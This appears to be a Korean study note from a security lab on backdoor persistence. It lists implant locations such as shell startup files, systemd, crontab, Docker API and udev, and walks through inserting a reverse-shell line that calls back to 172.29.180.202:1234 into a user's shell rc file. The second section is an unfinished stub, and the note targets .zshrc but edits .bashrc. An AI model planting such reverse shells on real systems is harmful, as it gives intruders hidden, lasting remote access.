# 백도어 지속성 확보 & 삽입 실습

### 지속성(Persistence) 확보
- 공격 대상의 서버 혹은 사용자가 로그아웃했을 때 사라지거나,  
재부팅 후 돌아왔을 때 작동하지 않는다면 의미가 없다.
- 따라서 눈에 띄지 않는 곳에 삽입하고, 로그아웃/재부팅과 상관없이 자동으로 실행되도록 만들어줘야한다.
- 이러한 과정을 통해 공격자가 시스템에 대한 장기적인 접근권한을 확보해줘야한다.

<br>

### 삽입(Implantation) 방식
- `/etc/profile`, `/etc/bash.bashrc`과 같이 Bash 쉘 초기화 스크립트 파일에 삽입한다.
- `systemd`, `crontab`과 같은 자동 실행 도구를 활용해 간단하게 실행시킨다.
- `Docker Remote API 삽입` : perfctl 라는 악성코드가 실제로 노출된 Docker API를 통해 원격 컨테이너에 배포된 사례이다.
공격자는 컨테이너를 privileged 모드로 실행해 호스트에 접근한다.
- `udev` 같은 하드웨어 이벤트 감지기에 넣는 경우 USB 연결시에 탈취하는 식으로 구현 가능하다.


<br>

### 백도어 구현 1    
첫번째로 kali1 사용자가 쉘을 시작할 때마다   
`bash -c 'bash -i >& /dev/tcp/172.29.180.202/1234 0>&1'`를 실행시키도록 만들어보자.  

쉘을 킬 때 실행되는 파일에 삽입하고, 쉘을 부팅시에도 파일 변화가 없으니 지속성도 확보할 수 있다.  

초기 쉘을 얻었다 가정하에  
이전에 다뤘던 Shell 안정화를 위한 명령어들을 입력해준다.  

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
ctrl Z
stty raw -echo; fg
stty rows 38 columns 116
```

안정화된 쉘을 얻었다면 bash를 킬 때 자동 실행되는 파일이 뭔지 찾아줘야한다.   

그러기 위해서  
```bash
echo $SHELL
```
명령어로 기본 쉘을 파악해준다.  

<br>

<img src="https://github.com/user-attachments/assets/91c6c6d0-cb4d-4ed7-8706-3222f554ebfa" width=300>    

Kali1 에서 쓰는 기본 쉘이 zsh인 것을 알았으니  
`~/.zshrc`에 삽입하면 쉘을 킬 때 마다 내 ip의 1234 포트로 연결 시도가 올 것이다.  

<br>

그럼 이제 
`ls -al ~` 명령어를 통해 홈 디렉토리 경로의 숨김 파일의 상세정보를 구경한다.  

<br>

<img src="https://github.com/user-attachments/assets/17d4286a-e974-499f-b0d7-e23d5c02e8da" width=800>  
<img src="https://github.com/user-attachments/assets/bd04859c-34be-4dbe-9dd9-ce91c8a3a58c" width=300>  

home/kali1 경로의 파일을 쭉 보면 `/.zshrc`는 kali1 소유에 쓰기 권한이 있는 것도 쉽게 알 수 있으므로 수정해준다.  

<img src="https://github.com/user-attachments/assets/e6014968-81cf-4b0c-bd63-419a77e3f275" width=800>   

<br>

```bash
nano ~/.bashrc
```

```bash
# Shell excution code
bash -c 'bash -i >& /dev/tcp/172.29.180.202/1234 0>&1'
```

이렇게 추가해주면  
kali1이 쉘을 시작할 때마다 실행될것이다.  

확인을 해보면  
<br>

<img src="https://github.com/user-attachments/assets/9fc5b433-3754-475d-afaf-2697511674a3" width=1000>   

아무것도 없이 쉘을 실행만 해도 연결이 되어있는 것을 볼 수 있다.  

<br>

### 백도어 구현 2  

`systemd`, `crontab` 구현부터 작성하면됨
